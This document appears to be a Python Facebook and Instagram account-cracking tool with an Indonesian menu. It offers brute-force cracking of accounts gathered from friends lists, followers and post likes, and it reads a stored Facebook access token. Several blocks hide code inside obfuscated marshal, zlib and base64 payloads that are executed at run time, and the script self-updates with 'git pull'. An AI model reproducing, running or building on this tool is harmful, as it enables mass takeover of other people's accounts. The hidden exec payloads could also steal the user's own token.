#!/usr/bin/python3
#-*-coding:utf-8-*-
#
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxdkj1vFDEQhtf7vZu7fByBC1BQp7lrIpQCIYREi5CSajrf2tEtsteX8Voh/BpS5i9NS0WNaKiwHU7hsOV5Xr+2Z2TL35P/WurHOz9+/vJBJIKpBB7IgEWmkEZmkEXmkEcWUESWUO74FVQ757f5aqgjG2h2zm3zbuu00EbuwSRyCtPIfdj3TFWpD+CAhZyZOtRHcBR1rmb6CRxHXag9/RSeRV2quT6Bk6grr+cwZ4mcf3t+l8ALwS6S5r7+ER7i4ymjCvkg+mH0srh2ZpReTN9L7sb+yqkL4zbemF2uUXLxyRj14Yvs3GjQu7ngcXsdOPZanr6k1FjK7K2lFCXlwaQa5bWTdrRUd1zJQXCkMlQ1mhotuzUf+q+SWutWGzSdtJZy53pB5Ypb+fqMZp0ZOocoh3Fx5UaH0lL76FH+2ZqBmn7DhfBrFnN/N5o4VKpfLTYcrcQiWNnKnmEZVPngYhUm7ePtsPEG1nHzYG6o+lvjPsFXYSWE38dLKzqOYim6Xi8vfcXF5pbqN9oIp+RbFr7WoQ/nbM0m//Q/3Nqzag==', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
	os.system("clear")
	print("""\033[1;91m
 ____                     _
|  _ \ _ __ ___ _ __ ___ \x1b[0;33m(_)_   _ _ __ ____
| |_) | '__/ _ \ '_ ` _ \| | | | | '_ ` _  |
\x1b[0;32m| __/ | |\x1b[0;36m |  __/ | | | | | | |_| | | | | | |
|_|   |_|  \___\033[1;91m|_| |_| |_|_|\__,_|_| |_| |_|\n""")

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJyVV1tz00gWVutm2XEghGsggIAkxBBfEkJIyGbYcNthIBmYMMBoinLJ7ratWJZESyKJytmHzewj8wO2pracl63iH8yP2F/Qr/tE7eO88bSnWzGXVIatsX26W6cv+s61j/8j7fsMAv0Z6LcdJElYsjghjGwZy5bSlCwVSAPSgTJABlAWKMfnsWINYNXKY80axLp1iBzuDe1K1hFyZH3YOooz2MBZnMMDOI8H8SF8GA/hI3i4mbeOJRfJUSy3pbAL/dG2Sv9Gju9ISIKnY6ck68RzyTutSuRkO0f/hST+Ted/kDz5hUROpW/qjeDju2gHWafJmfVR6yy0w9Y5aM9bJjlGToxI1gVysXcJMI2R8fUJMta7vCsBdxKfIJPEJBfI2YZ6QrIK+OTekwJPV34POT71S966SqbWi+slqwx9BfppPIJP/yRZM/gMHoX+Gj6Lz0E/i89jE/rr+AK+CP0cvoTHoL+Bx/EE9PP4Mp6EfgEX8BXob+Kra1L27dT7f6/4ieO6dvl6qWJOPnK8eHPRXPYw9R1sTlcWzRXHXHhqPqa+eTt2XFx+8vDJdGl6oTI/AzsqM4vmxuuCuRwELnlOag+dqHz92o3StTlz8uHXT1ceTZmu0ybmX0i97RfMZ4SGju+VZ+Fdd1rU75Dy/HypUpq9NjNbmp6fNlf8muMSc81u2NTpn/Tj/dvLq+V7K8uL928/ulN2cPXBXRguPyvPXFuA3ZXSNP8tLL5MzrSiKAhvlsudmh069VLDrpOa77dLdb/zjnvg/WS4v6RJ7U7L5zPJiQ/bPtuRHOd8YDuB4zX8kuOX10PfszLf2F4MAC3jPqlRMdJWbEoiS1sOqONaygpxLPWb2BOt61iZ5WYcRnFoZddIEJFOjVAr82078vnAWPVfpyzjLgnF6F0esL6DIJESYxyXxzvl8R+SgfGw2P8BOzTFr5C35Mo00AzQNaBZoOtAc0A3gOaBFix5ugIE66Zn6vvDUge6AxQegyaS1lFPjpSeilGk7cq7aE16K69SFeYKOss6gY0xJWHIBh48fj27vPdwtBpG1PGa1QaYteoEVceLmE5tD/sdluE9Zxgryy+qDx4/m30r0UNwoGjeHyuHuG5TXMZ1p1N2npKwFGyxgXQznPV69ipHJ3OsiA5B+8dFoBmBnxrQCeRze8hpjuMY4A1X+geIcx8Bps1hsfMjqLniJ6COclDoE0Ccr/ZBzUDTlTA6Kd2VXo5toxRgF+0ilIJVdiHdRGpPwzLnvTKwtCYVlFWGcs1fz/39v09+/ectUL4SboVMDyPsxxHTNqgTEaY13DhsMTVyOvAQuoQEBZmhhCGyH7y2bru2V+GIDAE7D98comcP0qjSB38bGrwHeVdq6/S00KwA6o1h5ZOZWTGjipncx1VCGG010SEZQH5hWt0lNmXKhuMxpe6GBY0eF6oPXDtq+LTDNNffIJTJPhd3K4SIOcga9Bw0cxxjTohzCMThJPifWUMDyvQF+ocQiFuhhyJ5XcFypO5w+yhvlHUN4Mvbclde17GGdZx5I4PNvttWsNFVegrO7iIQtCT25fqck7Cbn4EH3ihgRz6X//TMbRUPdtVeRiiphPVt9KrURVhvy/RnrK9JkYEP7fQVdXj1fjL5hTxWBhs2Y7tJSkGLmzrTIjaGxMoydVjhkDAZaEUdtxTYNAQdIvtpATG1RUnD0kTupJM8r4x+6RUFmU5wBY/zlZe/tDKgfgNSNseSnLcD29wCdCYEiW0GTtuhbdszQ9K2IW6ayZEfL7w0n1MfVtxJsRayTKmFs9bgbWLHkdOI3TU/DiyDklcxCaOQKU0Crt7Cdb8NPk42I8toOB6u2q5LL3KnUcmmE4EHcbwMNSyZgswOQ7X93q9yvS1xBzghvEVFo2gY/GUUHQOf0ZGBVJlO/99QSN0dQ+zS+TR2+RjKC4VWIjXSMJQIPR3KBbD2DuK25aWEp6f9XlwnKiivnebULL0k4AV21GI6SMPFzoDYoZMQdoQPqtipR9U98zLVD4jHVApmh4CHrBtYqus3wwMTVg5sRtKdDz9GSh4NgdQGogv75eV5a6Av75yQd1vkLixjBatYS2MGQlvvSjy1wlzmpNQvYX7JbaMuSF3IryaXHFx8cHfKwYuvliqlhSniFb9fE+N5GIvBjWSwmTjBlIlJA2KfJN9zE5e5/07ZUFM4dTviBcMm51zd3M/tuHtHOx2Ih/IGqQV7QzvwmlNXylfS11FuQSYlWXDiydKVW4Wx5HwZVOZ45VsevHACgmMJ19yJhsuHDl6aT7Ide7MIRy1VGJpOLnz23uLGxkaRJ6piTF3i1X1McCHHdJ86cGZy2K7X4Zov9gP1A0MshUvS0lNGkoshRPlbvMhSv/bDyMrA+wklNBms2/UWKdZ9L6K+m4zEARQsmBQdD+wZU1Lsh0iS52vghGK0FZCCBrEOBzF13Xc8WuCCy5SwDI8aCJqCbGl8PmSI7k+n/Jb9jttdF56gohISvM9SqfJpKv0rNE2Jp9IuJFPu8JAsazx9YjQCiTBS+vwdcKBTEiS8x13UU2FeHoHkyBNnOh6RTkri6hv6/Xms9teAG2r8+gRH09PShHLM79HSe3nRpDeltFYhXtwhFPyKqW0CV6fi8sBxIcKYDgYlUOZ+BUvfKmn20KEeiN2Ilg+Io7yIw70QfMFlz+9lkSE0KploDNGHB6kq11fVT9A4oKpkHlQi8ZwBqpoAVaEe6srAgVjCyoj0YayOSA7qq+Q55I30r4nYrf2B3atdpMNfmTXpRZp99NX3aJHyVPZRcZRDhLtEC8HLQTlxgEFr9MEBd+51aKpcoOE9+WXIoWOQP3XRi/nVwiKTY5spsT1Dl9Lk6/sB3OdtJtcDpkSRy5RgY5Mb4zVYBzy9zRTswDCMYCGwvTYTjtqBU6jLDA5I1DiK52/AKXArdMDvWwx5TKvFEGuUF2RM856STsByz2w3Jvco9aHQgCTJDGga4gAdxxQuMrgvY0ohbpi6xcsRObKZXIsBhr3F5BY8cCD8tUyLfM7MdLaq4tmo2+BJGDYBrK2qZ8OpmQ1C2ulWyjIRhH7TBiGjpsuyAl4VhBblJ81ynNnq8qNH1W9X761R/reYHuEN16kocEVBKQozUcyIe0kkaxGQwtWEpg/M+cafOj6OXfIVd8bfLGhUCOYvfQ2w3ihYcgj6tIYaFhaFW1E24HkI6Jxi8CfZUAzdyBiHgKD/H56JCU8=', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((R+"["+p+"â€¢"+R+"]"+R+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print("\033[1;91m[Ã—]--------------------------------------------[Ã—]")
    print("\033[1;91m[Ã—]\x1b[0;37m Developer : Muhammad Dicky Wahyudi         \033[1;91m[Ã—]")
    print("\033[1;91m[Ã—]--------------------------------------------[Ã—]")
    print("\033[1;91m[Ã—]"+p+" Hello     : [ "+a["name"]+p+" ]")
    print("\033[1;91m[Ã—]\x1b[0;37m Your ID   : "+id)
    print("\033[1;91m[Ã—]\x1b[0;37m Your IP   : "+ip)
    print("\033[1;91m[Ã—]\x1b[0;37m Status    : \033[1;91mFree User")
    print("\033[1;91m[Ã—]--------------------------------------------[Ã—]")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m1\033[1;91m] \x1b[0;37m Crack ID From Public/Friend \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m2\033[1;91m] \x1b[0;37m Crack ID From Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m3\033[1;91m] \x1b[0;37m Crack ID From Like Post \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m4\033[1;91m] \x1b[0;37m Get ID Public \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m5\033[1;91m] \x1b[0;37m Get ID Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m6\033[1;91m] \x1b[0;37m Result Crack")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m7\033[1;91m] \x1b[0;37m Cek Opsi Akun "+p+"["+R+"CHECKPOINT"+p+"] \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m8\033[1;91m] \x1b[0;37m Setting User Agent")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m9\033[1;91m] \x1b[0;37m Lapor Bug")
    print("\033[1;91m[\x1b[0;37m1\x1b[0;37m0\033[1;91m] \x1b[0;37m Crack instagram \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m0\033[1;91m] \x1b[0;37m Logout")
    print("\033[1;91m[Ã—]--------------------------------------------[Ã—]")
    choose_menu()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
    
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
		
if __name__=="__main__":
	os.system("git pull")
	menu()
































































